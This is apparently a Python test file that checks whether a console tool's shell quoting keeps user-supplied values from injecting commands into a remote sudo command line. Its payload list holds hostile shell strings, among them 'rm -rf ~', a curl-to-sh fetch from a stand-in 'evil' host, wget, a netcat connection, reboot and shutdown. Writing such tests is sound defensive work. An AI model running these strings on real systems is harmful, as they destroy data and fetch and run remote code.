"""
test_remote_command_injection.py — the remote command string must be shell-safe.

run_remote runs its command through the remote login shell, so user-supplied arg
values must be quoted or they inject shell syntax (worse: under `sudo -u`). The
quoting is shell_join's job; these tests assert a malicious value survives as a
single literal token — i.e. the remote shell parses the line back to exactly the
argv we intended, with no extra commands spawned.

Kept free of the `runspec` core import (lazy in the executor; not a console test
dependency) by building the escalation prefix the way build_become_argv would.
"""

from __future__ import annotations

import shlex

from runspec_console.executor import args_to_argv, shell_join

BIN = "/home/svc/.venv/bin/catalog"
# What build_become_argv(..., run_as="svc", "sudo", env={"RUNSPEC_AGENT": "1"})
# prepends to the bare command.
SUDO_PREFIX = ["sudo", "-u", "svc", "env", "RUNSPEC_AGENT=1"]

# Classic shell-injection payloads a reviewer would try in a text field.
PAYLOADS = [
    "X; rm -rf ~",
    "$(curl http://evil/x | sh)",
    "a`reboot`b",
    "x && wget evil",
    "y | nc evil 1234",
    "z\nmalicious",
    "normal value with spaces",
]


def _remote_cmd(args: dict[str, object]) -> str:
    argv = args_to_argv(args)
    parts = [*SUDO_PREFIX, BIN, "show", *argv]
    return shell_join(parts)


def test_payloads_survive_as_single_tokens():
    for payload in PAYLOADS:
        cmd = _remote_cmd({"value": payload})
        tokens = shlex.split(cmd)
        # The payload is exactly one argv token — the shell never splits on
        # ; | $() ` && or newline, so no second command runs.
        assert payload in tokens, f"payload not a single token: {payload!r}"
        assert tokens[tokens.index("--value") + 1] == payload


def test_escalation_prefix_intact_and_safe():
    cmd = _remote_cmd({"sku": "WIDGET1; shutdown now"})
    tokens = shlex.split(cmd)
    assert tokens[:5] == SUDO_PREFIX
    assert BIN in tokens
    assert "WIDGET1; shutdown now" in tokens
    # No bare "shutdown" token leaked out of the quoted value.
    assert "shutdown" not in tokens


def test_roundtrip_equals_intended_argv():
    argv = args_to_argv({"field": "$(id)", "value": "a b c"})
    parts = [BIN, "field", *argv]
    assert shlex.split(shell_join(parts)) == [
        BIN,
        "field",
        "--field",
        "$(id)",
        "--value",
        "a b c",
    ]


def test_plain_values_are_not_needlessly_mangled():
    # A benign value round-trips unchanged (and stays a single token).
    cmd = shell_join([BIN, "show", "--sku", "WIDGET1"])
    assert cmd == f"{BIN} show --sku WIDGET1"
